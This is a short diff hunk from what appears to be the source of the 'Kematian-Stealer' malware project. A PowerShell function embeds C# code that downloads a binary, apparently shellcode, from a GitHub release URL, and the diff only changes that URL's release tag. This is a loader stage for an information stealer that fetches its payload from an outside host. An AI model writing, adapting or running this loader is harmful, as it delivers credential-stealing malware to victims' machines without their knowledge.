@@ -12,7 +12,7 @@ function kematian {
 
         public static void Main() {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            string url = "https://github.com/Somali-Devs/Kematian-Stealer/releases/download/AutoBuild/kematian.bin";
+            string url = "https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin";
             byte[] golangshc;
             using (WebClient client = new WebClient()) {
                 golangshc = client.DownloadData(url);
